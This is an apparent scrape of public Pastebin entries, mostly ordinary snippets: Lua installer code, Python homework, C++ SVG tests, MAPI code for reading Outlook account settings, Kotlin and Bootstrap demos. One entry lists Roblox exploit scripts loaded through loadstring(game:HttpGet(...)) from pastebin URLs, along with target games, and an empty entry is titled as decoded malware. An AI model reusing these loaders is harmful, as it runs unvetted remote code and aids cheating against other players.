		term.write(""Save as + in directory: "")
		term.setCursorPos(1,3)
		local saveAs = read()

		InstallFromGit(repoFile, saveAs)
	else
		term.clear()
		term.setTextColor(colors.green)
		print(""Done Installing Modules."")
	end
end

--Put all our things here we for sure want installed.
-- Just the filenames.
--Check for updates to the installer.
InstallFromGit(""SeanwareInstaller"", ""SeanwareInstaller"")

term.setTextColor(colors.orange)
print(""Installing Dependencies ... "")
InstallFromGit(""json"", ""json"")
InstallFromGit(""TurtleMovementUtil"", ""TurtleMovementUtil"")

-- Any additional stuff
InstallAdditionalModules()"
1nW5Jc7P,Cart Ride Into The Krusty Krab,robinmollen,Lua,Tuesday 4th of July 2023 04:00:04 PM CDT,"require(13904101403).RAroblox(""YourNameHere"")"
dP4iRDCY,Harked Remakes and scripts similar to Harked,EcoSploit,Lua,Tuesday 4th of July 2023 03:58:02 PM CDT,"--Harked remakes and similar scripts
--List Made by LuaE (https://www.youtube.com/channel/UCftJjZ60WyoXrpHrcLd4YTQ)

--[[Harked V1:]] loadstring(game:HttpGet(""https://pastebin.com/raw/RnLYtYrS""))()
--[[Harked V3:]] loadstring(game:HttpGet(""https://pastebin.com/raw/fXDiEgFy""))()
--[[USP Ligma FE:]] loadstring(game:HttpGet(""https://pastebin.com/raw/6ypMfGeD""))()
--[[Overdrive FE:]] loadstring(game:HttpGet(""https://pastebin.com/raw/X6AEniaH""))()

--[[Games these work on:
https://www.roblox.com/games/3432786397/Pet-Mining-Simulator
https://www.roblox.com/games/1217895158/TIPS-Venti-Cafe (someone in server must have segway pass)
https://www.roblox.com/games/4897796860/KPOP-VISIONARY-DANCE-STUDIO (someone in server must have segway pass)
]]

--[[Bru GUI by Reggie:]] loadstring(game:HttpGet(""https://pastebin.com/raw/sB0WxBWS""))()
--[[Bru works on https://www.roblox.com/games/2761700287/Paradise-Island-Resort (if someone has a segway in the server)]]"
QgzBkMrN,horaBotDecoded.ps.malw,e55db081d05f58a,PowerShell,Tuesday 4th of July 2023 03:46:16 PM CDT,
4J5d86jq,Untitled,ohwhatalovelyday,Python,Tuesday 4th of July 2023 03:44:02 PM CDT,"import string


def task1() -> bool:
    return True


def task2() -> bool:
    password1 = input()
    password2 = input()
    return password1 == password2  # False


def task3() -> int:
    a = int(input())
    b = int(input())
    c = int(input())
    d = int(input())
    return min(a, b, c, d)


def task4() -> int:
    a = int(input())
    b = int(input())
    c = int(input())
    d = int(input())
    return max(a, b, c, d)


def task5() -> bool:
    a = int(input())
    b = int(input())
    c = int(input())
    return (a < (b + c)) and (b < (a + c)) and (c < (a + b))


def task6() -> string:
    a = int(input())
    b = int(input())
    c = int(input())
    if not((a < (b + c)) and (b < (a + c)) and (c < (a + b))):
        return 'вырожденный'
    if a == b and a == c and b == c:
        return 'равносторонний'
    if (a == b and a != c) or (b == c and a != b) or (c == a and a != b):
        return 'равнобедренный'
    return 'разносторонний'


def task7() -> int:
    a = int(input())
    b = int(input())
    c = int(input())
    d = int(input())
    if c < a:   # инвариант: первый отрезок всегда левее
        a, c = c, a
        b, d = d, b
    length = min(b, d) - max(a, c) + 1
    return length


def main():
    print(task1())
    print(task2())
    print(task3())
    print(task4())
    print(task5())
    print(task6())
    print(task7())


if __name__ == '__main__':
    main()
"
HcpAwP2v,Untitled,ohwhatalovelyday,Python,Tuesday 4th of July 2023 03:43:17 PM CDT,"from math import sqrt


def task1():
    print(input() + input() + input())


def task2():
    a = int(input())
    b = int(input())
    print(2 ** 8 * a ** 8 - 2 ** 4 * a ** 4 + 2 ** 2 * a ** 2 - 2 * b + 1 / 2 * sqrt(b) + a * b ** (a + b) / 2)


def task3():
    a = input()
    b = input()
    print(a + b, end='!')  # 23!


def task4():
    print('(123 + 456 − 789) % 10 = 0')


def task5():
    x = int(input())
    print(x + 1, x - 1, sep='')


def task6():
    km = int(input())
    print(km // 100000)


def main():
    task1()
    task2()
    task3()
    task4()
    task5()
    task6()


if __name__ == '__main__':
    main()
"
iRdsdx81,TestColor1,cepxuozab,C++,Tuesday 4th of July 2023 03:42:10 PM CDT,"void ColorTest() {
        {
            Circle().SetFillColor(Rgb(1, 2, 3)).Render(cout);
            cout << ""endl"";
        } {
            Circle().SetFillColor(Rgba(1, 2, 3, 0.5)).Render(cout);
            cout << ""endl"";
        } {
            Circle().SetFillColor(""black"").Render(cout);
            cout << ""endl"";
        } {
            Circle().SetFillColor(""be"").Render(cout);
            cout << ""endl"";
        } {
            Circle().SetFillColor(NoneColor).Render(cout);
        }
    }

<circle cx=""0"" cy=""0"" r=""1"" fill=""rgb(1,2,3)""/>
endl<circle cx=""0"" cy=""0"" r=""1"" fill=""rgb(1,2,3,0.5)""/>
endl<circle cx=""0"" cy=""0"" r=""1"" fill=""black""/>
endl<circle cx=""0"" cy=""0"" r=""1"" fill=""be""/>
endl<circle cx=""0"" cy=""0"" r=""1"" fill=""none""/>"
HZfdxfm7,TestColor,cepxuozab,C++,Tuesday 4th of July 2023 03:22:24 PM CDT,"void ColorTest() {
        {
            Circle().SetFillColor(Rgb(1, 2, 3)).Render(cout);
            cout << ""endl"";
        } {
            Circle().SetFillColor(Rgba(1, 2, 3, 0.5)).Render(cout);
            cout << ""endl"";
        } {
            Circle().SetFillColor(""black"").Render(cout);
            cout << ""endl"";
        } {
            Circle().SetFillColor(""be"").Render(cout);
            cout << ""endl"";
        } {
            Circle().SetFillColor(NoneColor).Render(cout);
        }
    }"
YveM0JnK,MAPI get Accounts,kdacmc,C++,Tuesday 4th of July 2023 02:54:45 PM CDT,"HRESULT GetAccounts(LPWSTR lpwszProfile, DWORD* pcAccounts, AccountData** ppAccounts, DWORD *firstAcc, LPMAPISESSION lpSession)
{
	HRESULT hRes = S_OK;
	LPOLKACCOUNTMANAGER lpAcctMgr = NULL;
	DWORD pcAccts = 0;
	DWORD* prgAccts = NULL;
	
	hRes = CoCreateInstance(CLSID_OlkAccountManager, 
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_IOlkAccountManager,
		(LPVOID*)&lpAcctMgr);
	if(SUCCEEDED(hRes) && lpAcctMgr)
	{
		CAccountHelper* pMyAcctHelper = new CAccountHelper(lpwszProfile, lpSession);
		if(pMyAcctHelper)
		{
			LPOLKACCOUNTHELPER lpAcctHelper = NULL;
			hRes = pMyAcctHelper->QueryInterface(IID_IOlkAccountHelper, (LPVOID*)&lpAcctHelper);
			if(SUCCEEDED(hRes) && lpAcctHelper)
			{	
				hRes = lpAcctMgr->Init(lpAcctHelper, ACCT_INIT_NOSYNCH_MAPI_ACCTS);
				if(SUCCEEDED(hRes))
				{
					hRes = lpAcctMgr->GetOrder(&CLSID_OlkMail, &pcAccts, &prgAccts);
					if (SUCCEEDED(hRes) && prgAccts && pcAccts >= 0) {
						*firstAcc = prgAccts[0];
						lpAcctMgr->FreeMemory((BYTE*)prgAccts);
					}
					LPOLKENUM lpAcctEnum = NULL;
					
					hRes = lpAcctMgr->EnumerateAccounts(&CLSID_OlkMail, 
						NULL, 
						OLK_ACCOUNT_NO_FLAGS,
						&lpAcctEnum);
					if(SUCCEEDED(hRes) && lpAcctEnum)
					{
						DWORD cAccounts = 0;
						
						hRes = lpAcctEnum->GetCount(&cAccounts);
						if(SUCCEEDED(hRes) && cAccounts)
						{
							AccountData* pAccounts = new AccountData[cAccounts];
							
							hRes = lpAcctEnum->Reset();
							if(SUCCEEDED(hRes))
							{
								DWORD i = 0;
								for (i = 0; i < cAccounts; i++)
								{
									LPUNKNOWN lpUnk = NULL;
									
									hRes = lpAcctEnum->GetNext(&lpUnk);
									if(SUCCEEDED(hRes) && lpUnk)
									{
										LPOLKACCOUNT lpAccount = NULL;
										
										hRes = lpUnk->QueryInterface(IID_IOlkAccount, (LPVOID*)&lpAccount);
										if(SUCCEEDED(hRes) && lpAccount)
										{		
											ACCT_VARIANT pProp = {0};
											
											//Account ID
											hRes = lpAccount->GetProp(PROP_ACCT_ID, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.dw)
											{	
												pAccounts[i].lAccountID = pProp.Val.dw;
											}
											//Account Name
											hRes = lpAccount->GetProp(PROP_ACCT_NAME, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szAccountName = pProp.Val.pwsz;
											}

											//Is Exchange account flag
											hRes = lpAccount->GetProp(PROP_ACCT_IS_EXCH, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.dw)
											{	
												pAccounts[i].lIsExchange = pProp.Val.dw;
												//if(1 == pAccounts[i].M_PROP_ACCT_IS_EXCH)
												//{
												//	GetExchangeAccountDetails(lpSession,&pAccounts[i]);
												//	pAccounts[i].ProcessData();
												//	continue;
												//}
											}
											else
											{
												pAccounts[i].lIsExchange = 0;
											}
												
											//Account Send Stamp
											hRes = lpAccount->GetProp(PROP_ACCT_SEND_STAMP, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szSendStamp = pProp.Val.pwsz;
												lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}

											//Account Stamp
											hRes = lpAccount->GetProp(PROP_ACCT_STAMP, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szAccountStamp = pProp.Val.pwsz;
												hRes = lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}
											//-----------------------------
											//Account User Display Name
											hRes = lpAccount->GetProp(PROP_ACCT_USER_DISPLAY_NAME, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szUserDisplayName = pProp.Val.pwsz;
												hRes = lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}
											//Account Type
											hRes = lpAccount->GetProp(PROP_ACCT_TYPE, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szAccountType = pProp.Val.pwsz;
												lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}

											//Account Address
											hRes = lpAccount->GetProp(PROP_ACCT_ADDRESS, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szEmailID = pProp.Val.pwsz;
												lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}
											//-----------------------------
											//Account POP3 Server
											hRes = lpAccount->GetProp(PROP_ACCT_POP3_SERVER, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szIncomingServer = pProp.Val.pwsz;
												lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}
											//Account POP3 Name
											hRes = lpAccount->GetProp(PROP_ACCT_POP3_NAME, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szIncomingLoginName = pProp.Val.pwsz;
												lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}
											//POP3 Port
											hRes = lpAccount->GetProp(PROP_ACCT_POP3_PORT, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.dw)
											{	
												pAccounts[i].lIncomingPort = pProp.Val.dw;
											}
											//POP3 use SSL
											hRes = lpAccount->GetProp(PROP_ACCT_POP3_USE_SSL, &pProp);
											if(SUCCEEDED(hRes))
											{	
												pAccounts[i].lIncomingSSL = pProp.Val.dw;
											}
											//POP3 use SPA
											hRes = lpAccount->GetProp(PROP_ACCT_POP3_USE_SPA, &pProp);
											if(SUCCEEDED(hRes))
											{	
												pAccounts[i].lIncomingSPA = pProp.Val.dw;
											}
											//--------------SMTP Server------------------
											//SMTP server
											hRes = lpAccount->GetProp(PROP_ACCT_SMTP_SERVER, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szOutgoingServer = pProp.Val.pwsz;
												lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}
											//Login for smtp server SMTP server
											hRes = lpAccount->GetProp(PROP_ACCT_SMTP_NAME, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].szOutgoingLoginName = pProp.Val.pwsz;
												hRes = lpAccount->FreeMemory((LPBYTE)pProp.Val.pwsz);
											}
											//SMTP Authentication type
											hRes = lpAccount->GetProp(PROP_ACCT_SMTP_LOGON_KIND, &pProp);
											if(SUCCEEDED(hRes))
											{	
												pAccounts[i].lOutgoingServerAuthenticationType = pProp.Val.dw;
											}
											//SMTP Port
											hRes = lpAccount->GetProp(PROP_ACCT_SMTP_PORT, &pProp);
											if(SUCCEEDED(hRes) && pProp.Val.pwsz)
											{	
												pAccounts[i].lOutgoingPort = pProp.Val.dw;
											}
											//SMTP USE SSL
											hRes = lpAccount->GetProp(PROP_ACCT_SMTP_USE_SSL, &pProp);
											if(SUCCEEDED(hRes))
											{	
												pAccounts[i].lOutgoingSSL = pProp.Val.dw;
											}
											//SMTP Use Auth
											hRes = lpAccount->GetProp(PROP_ACCT_SMTP_USE_AUTH, &pProp);
											if(SUCCEEDED(hRes))
											{	
												pAccounts[i].lOutgoingUseAuthentication = pProp.Val.dw;
											}
											//SMTP Use SPA
											hRes = lpAccount->GetProp(PROP_ACCT_USE_SPA, &pProp);
											if(SUCCEEDED(hRes))
											{	
												pAccounts[i].lOutgoingSPA = pProp.Val.dw;
											}
											//---------------------------------
											//Account Timeout
											hRes = lpAccount->GetProp(PROP_ACCT_TIMEOUT, &pProp);
											if(SUCCEEDED(hRes))
											{	
												pAccounts[i].lTimeOut = pProp.Val.dw;
											}
											// IMAP store ID
											hRes = lpAccount->GetProp(PROP_ACCT_SENTITEMS_EID, &pProp);
											if (FAILED(hRes))
												return -1;
											if (SUCCEEDED(hRes))
											{
												ULONG type;
												LPMAPIFOLDER folder;
												LPSPropValue pVal;
												ENTRYID id;
												for (int j = 0; j < 4; j++)
													id.abFlags[j] = 0;
												memcpy(id.ab, pProp.Val.bin.pb, pProp.Val.bin.cb);
												lpAccount->FreeMemory(pProp.Val.bin.pb);
												hRes = lpSession->OpenEntry(pProp.Val.bin.cb, &id, &IID_IMAPIFolder, MAPI_MODIFY, &type, (LPUNKNOWN*) &folder);
												if (FAILED(hRes))
													return -2;
												if (SUCCEEDED(hRes)) {
													hRes = HrGetOneProp(folder, PR_STORE_ENTRYID, &pVal);
													if (FAILED(hRes))
														return -3;
													if (SUCCEEDED(hRes)) {
														SBinary bin = pVal->Value.bin;
														std::ostringstream out;
														out << std::hex << std::uppercase << std::noshowbase
															<< std::setfill('0');
														for (DWORD j = 0; j < bin.cb; j++)
															out << std::setw(2) << static_cast<int>(bin.lpb[j]);
														MAPIFreeBuffer(bin.lpb);
														size_t size = bin.cb * 2 + 1;
														pAccounts[i].szImapStoreId = new wchar_t[size];
														size_t outSize;
														mbstowcs_s(&outSize,
															pAccounts[i].szImapStoreId,
															size,
															out.str().c_str(),
															size - 1);
													}
												}
												if (folder)
													folder->Release();
												folder = NULL;
											}

											//hRes = lpAccount->GetProp(PROP_ACCT_IMAP_STORE, &pProp);
											//if (SUCCEEDED(hRes))
											//{
											//	ACCT_BIN bin = pProp.Val.bin;
											//	std::ostringstream out;
											//	out << std::hex << std::uppercase << std::noshowbase
											//		<< std::setfill('0');
											//	for (DWORD j = 0; j < bin.cb; j++)
											//		out << std::setw(2) << static_cast<int>(bin.pb[j]);
											//	lpAccount->FreeMemory(pProp.Val.bin.pb);
											//	size_t size = bin.cb * 2 + 1;
											//	pAccounts[i].szImapStoreId = new wchar_t[size];
											//	size_t outSize;
											//	mbstowcs_s(&outSize,
											//		pAccounts[i].szImapStoreId,
											//		size,
											//		out.str().c_str(),
											//		size - 1);
											//}
										}
										
										if(lpAccount)
											lpAccount->Release();
										lpAccount = NULL;
									}

									if(lpUnk)
										lpUnk->Release();
									lpUnk = NULL;
								}

								*pcAccounts = cAccounts;
								*ppAccounts = pAccounts;
							}
						}
					}
					
					if(lpAcctEnum)
						lpAcctEnum->Release();
				}
			}

			if(lpAcctHelper)
				lpAcctHelper->Release();
		}

		if(pMyAcctHelper)
			pMyAcctHelper->Release();
	}	
	
	if(lpAcctMgr)
		lpAcctMgr->Release();

	return hRes;
}"
1fKXFuf8,Unsigned Numbers Kotlin,hhac,Kotlin,Tuesday 4th of July 2023 02:51:46 PM CDT,"/**
 * You can edit, run, and share this code.
 * play.kotlinlang.org
 */


fun main() {
   val value : Int = -1
   println(""Number: "" + value)

   var hexString = java.lang.Integer.toHexString(value)
   println(""Hex String for negative Number: "" + hexString)

   var binString = java.lang.Integer.toBinaryString(value)
   println(""Bin String for negative Number: "" + binString)

   val invertedSign = value.inv() + 1
    
   println(""Number: "" + invertedSign)
    
   hexString = java.lang.Integer.toHexString(invertedSign)
   println(""Hex String for negative Number: "" + hexString)
   
   binString = java.lang.Integer.toBinaryString(invertedSign)
   println(""Bin String for negative Number: "" + binString)
   
   val convert3 = value.toUInt()
    
   println(""Number Unsigned: "" + convert3)
}"
t46Nmhf9,Bootstrap - lezione 2,fcamuso,HTML,Tuesday 4th of July 2023 02:37:33 PM CDT,"<!doctype html>
<html lang=""en"">

<head>
  <title>Title</title>
  <!-- Required meta tags -->
  <meta charset=""utf-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1, shrink-to-fit=no"">

  <!-- Bootstrap CSS v5.3.0 -->
  <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"" rel=""stylesheet"" 
        integrity=""sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"" 
        crossorigin=""anonymous"">
</head>

<body>
  
  <button class=""btn btn-primary ms-4""> Bottone normale</button>
  <button class=""btn btn-primary btn-lg""> Bottone GRANDE</button>
  <button id=""btn"" class=""btn btn-primary btn-sm""> Bottone piccolo</button>
  <br><br>

  <!-- via attributi  -->
  <span id=""span"">
    <button id=""bottone_con_stato"" class=""btn btn-primary btn-lg"" disabled> Bottone disabilitato</button>
  </span>

  <!-- gruppi -->
  <div class=""btn-group mx-auto"">
    <button type=""button"" class=""btn btn-primary"">sx</button>
    <button type=""button"" class=""btn btn-primary"">centro</button>
    <button type=""button"" class=""btn btn-primary"">dx</button>
  </div>
  <br><br>

  <p class=""bg-body-secondary mx-auto w-25"">
    Lorem ipsum dolor sit amet consectetur adipisicing elit. Quam, officiis! Velit ut molestiae, asperiores dignissimos illum, dolorum magnam hic odit inventore eligendi temporibus recusandae sit illo ex. Blanditiis, nostrum quam?
  </p>

  <p class=""bg-danger mx-auto w-25"">
    Lorem ipsum dolor sit amet consectetur adipisicing elit. Quam, officiis! Velit ut molestiae, asperiores dignissimos illum, dolorum magnam hic odit inventore eligendi temporibus recusandae sit illo ex. Blanditiis, nostrum quam?
  </p>









  <!-- <p><a href=""#"" class=""link-primary"">Primary link</a></p>
  <p><a href=""#"" class=""link-secondary"">Secondary link</a></p>
  <p><a href=""#"" class=""link-success"">Success link</a></p>
  <p><a href=""#"" class=""link-danger"">Danger link</a></p>
  <p><a href=""#"" class=""link-warning"">Warning link</a></p>
  <p><a href=""#"" class=""link-info"">Info link</a></p>
  <p><a href=""#"" class=""link-light"">Light link</a></p>
  <p><a href=""#"" class=""link-dark"">Dark link</a></p>
  <p><a href=""#"" class=""link-body-emphasis"">Emphasis link</a></p> -->

  <!-- Bootstrap JavaScript Libraries -->
  <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"" 
          integrity=""sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"" 
          crossorigin=""anonymous""></script>

  <script>
    document.getElementById(""span"").addEventListener(""click"", function () {
      const btn = document.getElementById(""bottone_con_stato"");
      if (btn.getAttribute(""disabled"") === null)
        btn.setAttribute(""disabled"", ""disabled"");
      else
        btn.removeAttribute(""disabled"");
    });
  </script> 
  
</body>

</html>"
